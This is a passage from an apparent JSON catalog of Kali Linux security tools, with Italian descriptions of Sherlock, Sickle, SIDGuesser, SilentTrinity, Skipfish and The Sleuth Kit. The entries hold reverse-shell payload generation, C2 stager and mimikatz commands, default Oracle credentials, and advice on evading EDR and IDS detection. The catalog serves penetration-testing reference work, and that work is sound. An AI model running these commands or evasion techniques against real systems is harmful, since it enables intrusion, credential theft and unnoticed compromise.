    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sherlock</strong> e uno degli strumenti OSINT piu diffusi per la ricerca di account associati a uno specifico username su oltre 400 siti web, social network e piattaforme online. Sviluppato in Python e mantenuto attivamente dalla community, Sherlock verifica la disponibilita di un nome utente su ciascuna piattaforma supportata, identificando i profili esistenti e costruendo una mappa completa della presenza digitale di un individuo. Lo strumento opera inviando richieste HTTP a ciascun sito e analizzando le risposte per determinare se l'account esiste, non esiste o se il risultato e incerto. Sherlock e fondamentale nelle indagini OSINT per correlare identita online, tracciare l'attivita di un soggetto attraverso multiple piattaforme e scoprire account che il target potrebbe considerare nascosti o dimenticati.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Ricerca multi-piattaforma massiva:</strong> Sherlock interroga simultaneamente oltre 400 siti web e piattaforme social tra cui Twitter, Instagram, Reddit, GitHub, LinkedIn, TikTok, Steam e centinaia di altri servizi. Per ogni piattaforma, lo strumento utilizza metodi di detection specifici (status code, redirect, presenza di stringhe nel body) per determinare con precisione se un account con quel nome utente esiste. Il database dei siti supportati viene aggiornato regolarmente dalla community.</p><p><strong>Export e formattazione risultati:</strong> I risultati delle ricerche possono essere esportati in diversi formati tra cui CSV per analisi in spreadsheet, JSON per integrazione con altri strumenti OSINT e file di testo semplice. Ogni risultato include l'URL diretto al profilo identificato, facilitando la verifica manuale e la documentazione. E possibile anche generare output filtrato mostrando solo i risultati positivi per ridurre il rumore.</p><p><strong>Anonimizzazione e controllo del traffico:</strong> Sherlock supporta il routing delle richieste attraverso la rete Tor tramite proxy SOCKS5 per proteggere l'identita dell'investigatore durante le ricerche. Include funzionalita di rate limiting configurabile per evitare di essere bloccati dai sistemi anti-bot delle piattaforme target. E inoltre possibile specificare timeout personalizzati per gestire siti lenti o instabili senza bloccare l'intera scansione.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sherlock richiede Python 3 e le dipendenze installate tramite pip. L'utilizzo base richiede semplicemente lo username da cercare come argomento. Per indagini sensibili e fortemente consigliato l'uso di Tor.</p><pre><code># Ricerca base di un singolo username\nsherlock targetusername\n\n# Ricerca di multipli username contemporaneamente\nsherlock user1 user2 user3\n\n# Export risultati in formato CSV con timeout personalizzato\nsherlock --csv --timeout 15 targetusername\n\n# Ricerca anonimizzata attraverso rete Tor\nsherlock --tor targetusername\n\n# Mostra solo i siti dove l'account esiste\nsherlock --print-found targetusername\n\n# Salva risultati in cartella specifica\nsherlock --folderoutput ./results targetusername\n\n# Ricerca su siti specifici\nsherlock --site twitter --site github --site reddit targetusername</code></pre><p>I risultati vanno sempre verificati manualmente poiche falsi positivi sono comuni, specialmente su piattaforme con username generici. La correlazione tra profili trovati su piattaforme diverse richiede analisi qualitativa del contenuto per confermare che appartengano alla stessa persona.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nelle <strong>indagini OSINT professionali</strong>, Sherlock e il punto di partenza per mappare la presenza digitale di un soggetto di interesse. Partendo da un singolo username noto, e possibile scoprire decine di account su piattaforme diverse, ognuno dei quali puo rivelare informazioni aggiuntive come fotografie, connessioni sociali, interessi e abitudini utili per costruire un profilo completo del target.</p><p>Per attivita di <strong>due diligence e background check</strong>, organizzazioni e investigatori utilizzano Sherlock per verificare i profili social dichiarati da candidati o partner commerciali, identificando eventuali account non dichiarati che potrebbero rivelare comportamenti problematici o incongruenze con le informazioni fornite.</p><p>Nella <strong>protezione del proprio brand e identita digitale</strong>, aziende e individui utilizzano Sherlock per identificare account che utilizzano il loro nome o marchio su diverse piattaforme, facilitando azioni di protezione del brand e segnalazione di impersonation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Le ricerche generano centinaia di richieste HTTP verso siti diversi in breve tempo, un pattern di traffico distinguibile e potenzialmente loggabile da ISP o sistemi di monitoraggio di rete. Alcune piattaforme implementano rate limiting aggressivo e possono bloccare temporaneamente l'indirizzo IP sorgente. I CAPTCHA su alcuni siti possono invalidare i risultati per quelle piattaforme specifiche.</p><p><strong>Impatto operativo:</strong> L'indirizzo IP dell'investigatore viene esposto a tutti i siti interrogati a meno che non venga utilizzato Tor o un proxy. I falsi positivi richiedono verifica manuale che implica visite dirette ai profili, potenzialmente visibili al target su piattaforme che mostrano chi ha visualizzato il profilo (LinkedIn). Le ricerche senza Tor possono essere correlate all'investigatore.</p><p><strong>Mitigazioni:</strong> Utilizzare sempre Tor o una VPN dedicata per le ricerche OSINT. Distribuire le ricerche nel tempo e utilizzare timeout adeguati per ridurre il rischio di blocco. Non visitare direttamente i profili trovati dal proprio account personale per la verifica. Utilizzare browser dedicati in modalita privata per l'analisi manuale dei risultati e considerare l'uso di sock puppet accounts per la verifica su piattaforme con visibilita dei visitatori.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "sickle-tool",
    "name": "sickle-tool",
    "version": "3.1.0",
    "icon": "../app/icons/sickle-tool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sickle-tool/",
    "desc": "Sviluppo shellcode: genera, formatta e analizza payload per exploit development.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sickle</strong> e un framework dedicato allo sviluppo e alla manipolazione di shellcode, progettato per assistere exploit developer e red team operator nel processo di creazione, formattazione, analisi e debugging di payload binari. Lo strumento colma il gap tra la generazione grezza di shellcode e la sua integrazione in exploit funzionanti, offrendo un set completo di utility per ogni fase del workflow di payload development. Sickle supporta multiple architetture hardware tra cui x86, x86_64, ARM e MIPS, rendendolo versatile per scenari di exploitation su piattaforme diverse. Il tool e particolarmente apprezzato per la sua capacita di identificare bad characters nel payload, convertire shellcode tra diversi formati di output e fornire analisi di disassembly per la verifica del codice generato. Rappresenta uno strumento essenziale nel toolkit di chiunque si occupi di binary exploitation e sviluppo di exploit custom.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Generazione e formattazione payload:</strong> Sickle puo generare shellcode per diverse architetture e sistemi operativi, convertendolo automaticamente nel formato richiesto dal linguaggio di programmazione target. I formati supportati includono C, Python, Ruby, PowerShell, C#, JavaScript e raw binary. Questa funzionalita elimina il tedioso processo manuale di conversione e formattazione che tipicamente rallenta lo sviluppo di exploit, permettendo di passare rapidamente dalla generazione all'integrazione.</p><p><strong>Analisi bad characters:</strong> Una delle funzionalita piu critiche di Sickle e la capacita di analizzare payload binari per identificare bad characters, ovvero byte che vengono modificati, troncati o eliminati durante la trasmissione attraverso il vettore di attacco. Lo strumento confronta il payload originale con quello ricevuto dal target per identificare esattamente quali byte causano problemi. Questo processo, che manualmente richiederebbe ore di debugging, viene automatizzato in pochi secondi.</p><p><strong>Disassembly e analisi shellcode:</strong> Sickle integra capacita di disassembly che permettono di convertire shellcode binario in istruzioni assembly leggibili, facilitando la revisione, il debugging e la comprensione di payload esistenti. Supporta la disassembly per multiple architetture e fornisce output formattato con indirizzi, opcodes e mnemonici. Questa funzionalita e fondamentale per verificare la correttezza del payload prima del deployment e per analizzare shellcode di terze parti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Sickle viene tipicamente utilizzato come parte del workflow di exploit development, dopo la generazione iniziale del payload con strumenti come msfvenom. Puo essere integrato in script di automazione grazie alla sua interfaccia CLI consistente.</p><pre><code># Genera payload formattato in linguaggio C\nsickle -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f c\n\n# Analizza bad characters in un payload binario\nsickle -r payload.bin -b '\\x00\\x0a\\x0d\\x20'\n\n# Disassembla shellcode per architettura x86\nsickle -d -r shellcode.bin -a x86\n\n# Converti shellcode raw in formato Python\nsickle -f python -r raw_shellcode.bin\n\n# Genera in formato PowerShell per attacchi Windows\nsickle -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f powershell\n\n# Confronta payload originale con quello ricevuto per bad char detection\nsickle -c -r original.bin -e received.bin</code></pre><p>E buona pratica eseguire sempre l'analisi bad character prima di utilizzare un payload in un exploit reale. La mancata identificazione di anche un singolo bad character puo causare il fallimento completo dell'exploit o comportamenti imprevedibili.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Nello <strong>sviluppo di exploit per buffer overflow</strong>, Sickle e essenziale per preparare shellcode compatibile con il vettore di attacco specifico. Dopo aver identificato bad characters tramite fuzzing, lo strumento permette di generare payload che li evitano e di formattarli direttamente nel linguaggio utilizzato per lo script di exploitation, accelerando significativamente il ciclo di sviluppo.</p><p>Per <strong>analisi e reverse engineering di payload</strong>, il modulo di disassembly consente di esaminare shellcode sconosciuto per comprenderne il funzionamento, identificare syscall utilizzate e verificare che non contenga funzionalita malevole nascoste. Questo e utile sia in contesto offensivo per la revisione di payload di terze parti sia in contesto difensivo per l'analisi di malware.</p><p>Durante <strong>training e certificazioni di sicurezza</strong> come OSCP e OSCE, Sickle accelera il processo di sviluppo exploit permettendo agli studenti di concentrarsi sulla comprensione dei concetti piuttosto che sulla manipolazione manuale di byte, pur mantenendo visibilita completa su ogni passaggio del processo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I payload generati con template standard (specialmente quelli derivati da Metasploit) sono ampiamente riconosciuti dalle soluzioni antivirus e EDR. Le signature dei payload comuni sono presenti nei database di tutti i principali vendor di sicurezza. Anche payload formattati in formati diversi mantengono le stesse sequenze di byte che vengono rilevate durante l'esecuzione in memoria.</p><p><strong>Impatto operativo:</strong> L'utilizzo di Sickle stesso non genera traffico di rete ne lascia tracce sul target, essendo uno strumento di sviluppo locale. Tuttavia, i payload generati e deployati sul target lasceranno tracce in memoria e potenzialmente su disco. L'esecuzione di shellcode trigghera tipicamente hook NTDLL e callback registrate da soluzioni EDR.</p><p><strong>Mitigazioni:</strong> Utilizzare encoding custom e encoder multipli in catena per modificare la firma del payload. Testare sempre i payload contro le soluzioni di sicurezza specifiche del target in un ambiente lab replicato prima dell'operazione. Considerare tecniche di shellcode obfuscation avanzate come sleep obfuscation e indirect syscalls per evadere il monitoring comportamentale. Non utilizzare servizi di scanning online per i test di evasion.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "sidguesser",
    "name": "sidguesser",
    "version": "1.0.5",
    "icon": "../app/icons/sidguesser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sidguesser/",
    "desc": "Brute force SID Oracle Database per identificare istanze e database disponibili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SIDGuesser</strong> e uno strumento specializzato nell'enumerazione di SID (System Identifier) di database Oracle attraverso attacchi di brute force contro il TNS (Transparent Network Substrate) listener. Il SID e un identificatore univoco che distingue ciascuna istanza di database Oracle in esecuzione su un server, e la sua conoscenza e un prerequisito fondamentale per stabilire connessioni al database. Quando il TNS listener e configurato in modo sicuro e non rivela direttamente l'elenco delle istanze disponibili, SIDGuesser interviene provando sistematicamente nomi SID comuni e personalizzati fino a identificare quelli validi. Lo strumento e particolarmente rilevante durante penetration test su infrastrutture enterprise dove Oracle Database e ampiamente utilizzato per sistemi ERP, CRM e applicazioni business-critical. La scoperta di un SID valido apre la strada a tentativi di autenticazione e potenziale compromissione del database.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Brute force SID via TNS protocol:</strong> SIDGuesser comunica direttamente con il TNS listener di Oracle utilizzando il protocollo nativo per tentare connessioni con diversi SID candidati. Per ciascun tentativo, analizza la risposta del listener per determinare se il SID esiste (errore di autenticazione) o non esiste (errore di SID sconosciuto). Questa distinzione nelle risposte di errore permette di enumerare SID validi senza necessita di credenziali, sfruttando una caratteristica intrinseca del protocollo TNS.</p><p><strong>Wordlist personalizzabili:</strong> Lo strumento include una wordlist predefinita contenente i SID piu comuni utilizzati nelle installazioni Oracle (ORCL, XE, PROD, DEV, TEST, HR, FINANCE) e supporta dizionari personalizzati per scenari specifici. La possibilita di creare wordlist mirate basate su convenzioni di naming dell'organizzazione target (acronimi aziendali, nomi di progetto, pattern numerici) aumenta significativamente la probabilita di successo dell'enumerazione.</p><p><strong>Scansione multi-target:</strong> SIDGuesser puo operare su range di indirizzi IP per identificare tutte le istanze Oracle presenti in un segmento di rete. Questa funzionalita e particolarmente utile durante la fase di discovery iniziale di un penetration test per mappare l'intera superficie di attacco relativa ai database Oracle. Lo strumento gestisce connessioni multiple e timeout per ottimizzare la velocita di scansione su grandi reti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SIDGuesser richiede connettivita di rete verso la porta del TNS listener (default 1521). E consigliabile precedere l'enumerazione SID con una scansione delle porte per identificare tutti i listener Oracle attivi nella rete target.</p><pre><code># Brute force SID con wordlist predefinita\nsidguesser -i 192.168.1.100\n\n# Utilizza una wordlist personalizzata\nsidguesser -i 192.168.1.100 -d custom_sids.txt\n\n# Specifica porta TNS listener non standard\nsidguesser -i 192.168.1.100 -p 1522\n\n# Scansione di un intero range di indirizzi\nsidguesser -i 192.168.1.0/24 -d enterprise_sids.txt\n\n# Combinazione con odat per exploitation successiva\n# Dopo aver trovato il SID valido:\nodat all -s 192.168.1.100 -d DISCOVERED_SID</code></pre><p>Dopo aver identificato SID validi, il passo successivo tipico e tentare autenticazione con credenziali default Oracle (scott/tiger, sys/change_on_install, system/manager) o procedere con brute force delle credenziali utilizzando strumenti come odat, Hydra o Metasploit.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>penetration test su infrastrutture enterprise</strong>, SIDGuesser e fondamentale per la fase di enumerazione dei database Oracle. In ambienti dove il listener e configurato per non divulgare informazioni sulle istanze (ADMIN_RESTRICTIONS=ON), il brute force dei SID rappresenta l'unico metodo per scoprire i database disponibili e procedere con i test di sicurezza successivi.</p><p>Per <strong>assessment di conformita e hardening</strong>, gli amministratori di database utilizzano SIDGuesser per verificare che le istanze Oracle non siano raggiungibili con SID predefiniti o facilmente indovinabili. Un risultato positivo indica la necessita di rinominare le istanze con identificatori piu complessi o di implementare restrizioni aggiuntive sul listener.</p><p>Nell'ambito di <strong>asset discovery e inventario</strong>, lo strumento aiuta i team IT a identificare istanze Oracle non documentate o dimenticate nella rete aziendale, che rappresentano potenziali vulnerabilita se non gestite e aggiornate regolarmente.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I tentativi ripetuti di connessione al TNS listener con SID diversi vengono registrati nei log del listener Oracle (listener.log). Sistemi di monitoraggio database come Oracle Audit Vault possono generare alert per pattern anomali di connessione. IDS di rete possono identificare il brute force attraverso l'analisi del traffico TNS ripetitivo verso la porta del listener.</p><p><strong>Impatto operativo:</strong> Un elevato numero di tentativi in breve tempo puo causare degradazione delle prestazioni del listener, influenzando le connessioni legittime al database. In configurazioni con Oracle Connection Manager, i tentativi falliti possono attivare meccanismi di throttling. Il traffico generato e facilmente attribuibile all'indirizzo IP sorgente nei log del listener.</p><p><strong>Mitigazioni:</strong> Ridurre la velocita di scansione inserendo delay tra i tentativi per mimetizzarsi con il traffico normale. Utilizzare wordlist mirate e compatte piuttosto che dizionari massivi per minimizzare il numero di tentativi necessari. Eseguire la scansione durante orari di maggiore attivita per confondersi con il traffico legittimo. Verificare preventivamente con nmap se il listener e attivo e la versione di Oracle per calibrare l'approccio.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "silenttrinity",
    "name": "silenttrinity",
    "version": "0.4.6dev~20200310",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/silenttrinity/",
    "desc": "Framework C2 con agent Python/Boo per operazioni red team con evasion avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SilentTrinity</strong> (ST) e un framework Command and Control (C2) post-exploitation che si distingue per l'utilizzo innovativo del .NET Dynamic Language Runtime (DLR) e del linguaggio Boo per l'esecuzione degli agent sui sistemi compromessi. Questo approccio permette l'esecuzione completa in memoria senza scrivere file su disco, evitando le detection tradizionali basate su scansione del filesystem. L'architettura di SilentTrinity segue il modello teamserver/client tipico dei framework C2 moderni, supportando operazioni multi-operatore con gestione centralizzata delle sessioni. Il framework include una libreria di moduli post-exploitation per credential harvesting, lateral movement, privilege escalation e persistence. SilentTrinity rappresenta un'alternativa valida a framework piu noti come Cobalt Strike e Sliver, offrendo un profilo di evasion diverso grazie all'utilizzo di tecnologie .NET meno monitorate.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Esecuzione in-memory via .NET DLR:</strong> SilentTrinity sfrutta il Dynamic Language Runtime di .NET per eseguire codice Boo direttamente in memoria, senza mai toccare il disco del sistema target. Il DLR e un componente legittimo del framework .NET presente su tutti i sistemi Windows moderni, il che rende l'esecuzione particolarmente stealth poiche utilizza infrastruttura gia presente e trusted dal sistema operativo. I moduli vengono compilati e caricati dinamicamente nell'address space del processo ospite.</p><p><strong>Architettura multi-protocollo e multi-operatore:</strong> Il teamserver supporta listener su protocolli multipli tra cui HTTP, HTTPS, WMI e DNS, permettendo di adattare le comunicazioni C2 all'ambiente di rete del target. Multipli operatori possono connettersi simultaneamente al teamserver per gestire sessioni condivise, coordinare attivita e assegnare task ai diversi implant. Il sistema di autenticazione protegge l'accesso al teamserver e tutte le comunicazioni sono cifrate.</p><p><strong>Sistema di moduli e stager flessibili:</strong> SilentTrinity offre un ampio catalogo di moduli post-exploitation scritti in Boo che coprono le fasi principali di un'operazione red team: enumeration del sistema, credential dumping (Mimikatz-like), lateral movement via WMI e DCOM, privilege escalation e persistence. Gli stager supportano diversi vettori di delivery tra cui MSBuild, WMIC e PowerShell, permettendo di adattare il metodo di esecuzione iniziale alle condizioni specifiche del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SilentTrinity utilizza un'architettura client-server dove il teamserver gestisce listener e sessioni, mentre il client fornisce l'interfaccia operativa. Il workflow tipico prevede l'avvio del teamserver, la configurazione di listener e la generazione di stager per l'esecuzione iniziale sui target.</p><pre><code># Avvia il teamserver sulla macchina C2\nst teamserver --ip 0.0.0.0 --port 5000 --password teampass\n\n# Connetti il client al teamserver\nst client --ip server_ip --port 5000 --password teampass\n\n# Configura un listener HTTP\nlisteners\nuse http\nset BindIP 0.0.0.0\nset Port 80\nstart\n\n# Genera uno stager MSBuild\nstagers\nuse msbuild\nset Listener http\ngenerate\n\n# Interagisci con una sessione attiva\nsessions\nuse SESSION_ID\nmodules\nuse mimikatz\nrun</code></pre><p>Lo stager generato (es. file .xml per MSBuild) deve essere trasferito ed eseguito sul target. Una volta che l'agent si connette al listener, la sessione appare nel teamserver e puo essere utilizzata per eseguire moduli post-exploitation.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>operazioni red team in ambienti Windows enterprise</strong>, SilentTrinity offre un canale C2 alternativo che sfrutta componenti .NET legittimi per l'esecuzione, risultando meno monitorato rispetto a PowerShell o WMI. La capacita di operare interamente in memoria lo rende particolarmente efficace contro organizzazioni che hanno implementato controlli sul filesystem ma non hanno visibilita completa sull'attivita .NET runtime.</p><p>Per <strong>lateral movement e post-exploitation</strong>, i moduli integrati permettono di eseguire credential harvesting, kerberoasting e pass-the-hash direttamente attraverso il framework senza necessita di caricare strumenti aggiuntivi sul target. Questo riduce la superficie di detection e centralizza il controllo operativo nel teamserver.</p><p>In scenari di <strong>evasion testing</strong>, SilentTrinity serve per valutare la capacita delle soluzioni EDR di rilevare attivita malicious che sfruttano il .NET DLR, fornendo insight specifici su gap nella copertura di detection che possono essere indirizzati dal blue team.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene l'esecuzione in-memory eviti la detection filesystem, le soluzioni EDR moderne monitorano il caricamento di assembly .NET e l'utilizzo del DLR. ETW (Event Tracing for Windows) provider come Microsoft-Windows-DotNETRuntime possono catturare eventi di compilazione e caricamento di moduli Boo. Gli stager MSBuild sono ormai un vettore noto e soggetto a regole di detection specifiche in molti SIEM.</p><p><strong>Impatto operativo:</strong> Il framework e open source e le sue signature sono presenti nei database dei principali vendor EDR. I pattern di comunicazione C2 (beacon intervals, jitter) possono essere identificati attraverso traffic analysis. L'utilizzo di MSBuild come vettore di esecuzione genera eventi di processo che sono comunemente monitorati nelle regole di detection (Sysmon Event ID 1).</p><p><strong>Mitigazioni:</strong> Modificare il codice sorgente del framework per alterare le signature note prima dell'utilizzo operativo. Configurare jitter elevato e beacon interval variabili per rendere piu difficile l'identificazione del pattern C2. Utilizzare comunicazioni HTTPS con domain fronting dove possibile. Preferire stager meno monitorati rispetto a MSBuild e personalizzare il metodo di delivery iniziale per l'ambiente specifico del target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "skipfish",
    "name": "skipfish",
    "version": "2.10b",
    "icon": "../app/icons/skipfish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/skipfish/",
    "desc": "Web scanner attivo ad alte prestazioni per mapping e vulnerability assessment.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Skipfish</strong> e uno scanner di sicurezza web ad alte prestazioni sviluppato originariamente da Michal Zalewski presso Google. Lo strumento esegue crawling ricorsivo e probing attivo di applicazioni web per identificare vulnerabilita di sicurezza, generando report HTML interattivi con mappe del sito e classificazione dei finding. Skipfish si distingue per le sue prestazioni eccezionali, capace di gestire oltre 2000 richieste al secondo grazie a un'implementazione asincrona in C puro con gestione intelligente delle connessioni HTTP. L'approccio di scanning combina crawling adattivo, che riconosce automaticamente la struttura dell'applicazione e i suoi pattern, con probe di sicurezza mirati per categorie di vulnerabilita come XSS, SQL injection, directory traversal e server-side injection. Skipfish e particolarmente adatto per assessment rapidi di applicazioni web di grandi dimensioni dove la velocita di scansione e un fattore critico.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Crawling adattivo ad alte prestazioni:</strong> Il motore di crawling di Skipfish utilizza I/O asincrono e multiplexing delle connessioni per raggiungere velocita di scansione superiori alla maggior parte degli scanner web. L'algoritmo adattivo riconosce pattern di URL, gestisce automaticamente form HTML, segue redirect e identifica contenuti dinamici differenziandoli da pagine statiche. Il crawler rispetta i limiti di rate configurati e si adatta alla velocita di risposta del server per evitare denial of service involontari.</p><p><strong>Detection multi-categoria di vulnerabilita:</strong> Skipfish testa attivamente per un ampio spettro di vulnerabilita web tra cui Cross-Site Scripting (riflesso e stored), SQL injection, directory traversal, shell injection, XML injection, format string bugs e problemi di configurazione del server. Per ogni categoria, utilizza probe specifici con diversi livelli di encoding e evasion per massimizzare la detection rate. I risultati vengono classificati per severita e tipo, facilitando la prioritizzazione durante il remediation.</p><p><strong>Reporting interattivo e sitemap:</strong> Al termine della scansione, Skipfish genera un report HTML completo e navigabile che include una mappa visuale del sito con la struttura dell'applicazione, i finding di sicurezza organizzati per severita e categoria, e i dettagli tecnici di ogni vulnerabilita identificata inclusi request e response. Il formato interattivo permette di esplorare i risultati senza strumenti aggiuntivi e facilita la condivisione con team di sviluppo.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Skipfish opera da linea di comando e richiede una directory di output dove salvare i risultati. E consigliabile configurare lo scope correttamente per evitare di scansionare domini esterni o aree non autorizzate dell'applicazione.</p><pre><code># Scansione base con directory di output per il report\nskipfish -o /tmp/scan_results http://target.com/\n\n# Scansione con autenticazione HTTP Basic\nskipfish -o /tmp/scan_results -A username:password http://target.com/\n\n# Utilizza wordlist personalizzata per directory discovery\nskipfish -o /tmp/scan_results -W /usr/share/skipfish/dictionaries/complete.wl http://target.com/\n\n# Limita la scansione a un path specifico\nskipfish -o /tmp/scan_results -I /webapp/ http://target.com/\n\n# Escludi path specifici dalla scansione\nskipfish -o /tmp/scan_results -X /logout -X /admin/ http://target.com/\n\n# Configura profondita massima di crawling e connessioni\nskipfish -o /tmp/scan_results -d 5 -c 20 http://target.com/</code></pre><p>Il report viene generato nella directory di output specificata e puo essere aperto direttamente nel browser. Per applicazioni di grandi dimensioni, considerare l'uso di scope limitati e scansioni incrementali per gestire il volume dei risultati. Skipfish non supporta autenticazione basata su cookie o sessioni complesse nativamente.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>assessment rapidi di applicazioni web</strong> dove il tempo e limitato, Skipfish offre un eccellente rapporto tra velocita e copertura. La capacita di scansionare migliaia di pagine al minuto lo rende ideale per la fase iniziale di un penetration test web, fornendo una panoramica rapida delle vulnerabilita presenti che possono poi essere approfondite manualmente con strumenti piu specializzati.</p><p>Durante <strong>processi di CI/CD e quality assurance</strong>, Skipfish puo essere integrato in pipeline automatizzate per eseguire scansioni di sicurezza su ogni rilascio dell'applicazione. I report HTML generati possono essere archiviati come artefatti del build e confrontati tra versioni per identificare regressioni di sicurezza introdotte da nuove modifiche al codice.</p><p>Per <strong>audit di conformita</strong> come PCI-DSS o OWASP Top 10, Skipfish fornisce evidenze documentate delle vulnerabilita identificate con dettagli tecnici sufficienti per la remediation e la verifica successiva, supportando il processo di certificazione con report strutturati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Skipfish genera un volume di traffico estremamente elevato che e immediatamente rilevabile da qualsiasi sistema di monitoraggio di rete o Web Application Firewall. Il pattern di richieste include probe di sicurezza con payload caratteristici (stringhe XSS, tentativi di SQL injection) che attivano regole di detection su WAF e IDS. Lo User-Agent di default identifica esplicitamente lo strumento.</p><p><strong>Impatto operativo:</strong> L'elevato volume di richieste puo causare degradazione delle prestazioni dell'applicazione target o del web server, potenzialmente impattando gli utenti legittimi. Le richieste di probing possono attivare meccanismi di lockout, generare migliaia di entry nei log del server e potenzialmente corrompere dati se i probe interagiscono con form di modifica dati senza adeguate protezioni CSRF.</p><p><strong>Mitigazioni:</strong> Ridurre il numero di connessioni parallele e la velocita di scansione in ambienti di produzione. Configurare lo User-Agent con un valore generico. Escludere funzionalita critiche (logout, eliminazione dati, form di pagamento) dallo scope della scansione. Eseguire preferibilmente su ambienti di staging. Coordinare con il team operations per evitare falsi allarmi e garantire che il traffico di scansione non venga bloccato dal WAF durante il test autorizzato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sleuthkit",
    "name": "sleuthkit",
    "version": "4.12.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sleuthkit/",
    "desc": "Suite forensics per analisi filesystem: timeline, file recovery, metadata extraction.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>The Sleuth Kit</strong> (TSK) e una suite di strumenti forensi open source che rappresenta uno dei pilastri fondamentali dell'analisi forense digitale. Sviluppato originariamente da Brian Carrier come evoluzione di The Coroner's Toolkit, TSK fornisce un insieme completo di utility da linea di comando per l'analisi di volumi, filesystem e file su immagini disco acquisite durante indagini forensi. La suite supporta un'ampia gamma di filesystem tra cui NTFS, FAT12/16/32, exFAT, EXT2/3/4, HFS+, APFS, UFS e ISO 9660, coprendo praticamente tutti i sistemi operativi moderni. TSK opera a diversi livelli di astrazione: volume system (analisi partizioni), filesystem (struttura directory e metadati), data unit (cluster e blocchi) e file name layer. Questa architettura stratificata permette analisi approfondite che vanno dal recupero di file cancellati alla ricostruzione di timeline complete degli eventi sul sistema. TSK e anche il backend del software forense Autopsy con interfaccia grafica.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Analisi filesystem multi-formato:</strong> TSK include strumenti specifici per ogni livello di analisi del filesystem. Il tool fsstat visualizza i metadati del filesystem (dimensione, stato, parametri), fls elenca file e directory inclusi quelli cancellati, e istat mostra i metadati dettagliati di specifici inode o MFT entries. Per NTFS, TSK analizza la Master File Table fornendo accesso a tutti gli attributi inclusi Alternate Data Streams, timeline $STANDARD_INFORMATION e $FILE_NAME. Questa granularita permette di identificare tecniche di timestomping e manipolazione dei metadati.</p><p><strong>Creazione timeline e analisi temporale:</strong> La combinazione di fls e mactime permette di generare timeline forensi complete che ricostruiscono la sequenza di eventi sul filesystem. Lo strumento fls estrae i timestamp MAC (Modified, Accessed, Changed/Created) per ogni file e li produce in formato body file. Mactime processa questo body file per generare una timeline ordinata cronologicamente in formato leggibile o CSV. Questa capacita e fondamentale per rispondere a domande investigative come quando un file e stato creato, modificato o cancellato.</p><p><strong>Recupero file e analisi spazio non allocato:</strong> TSK eccelle nel recupero di file cancellati e nell'analisi dello spazio non allocato del disco. Il tool icat estrae il contenuto di file specifici tramite il numero di inode, permettendo il recupero anche quando la directory entry e stata rimossa. Blkls e blkcalc operano a livello di data unit per estrarre e analizzare cluster non allocati dove possono risiedere frammenti di file cancellati. Il tool sorter classifica automaticamente i file recuperati per tipo basandosi su signature e header.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>TSK opera su immagini disco acquisite con strumenti come dd, FTK Imager o Guymager. E fondamentale lavorare sempre su copie forensi e mai sul dispositivo originale per preservare l'integrita delle prove.</p><pre><code># Visualizza la tabella delle partizioni dell'immagine disco\nmmls disk_image.dd\n\n# Elenca file (inclusi cancellati) ricorsivamente da una partizione\nfls -r -o 2048 disk_image.dd\n\n# Mostra metadati dettagliati di un file specifico tramite inode\nistat -o 2048 disk_image.dd 12345\n\n# Estrai un file specifico per numero 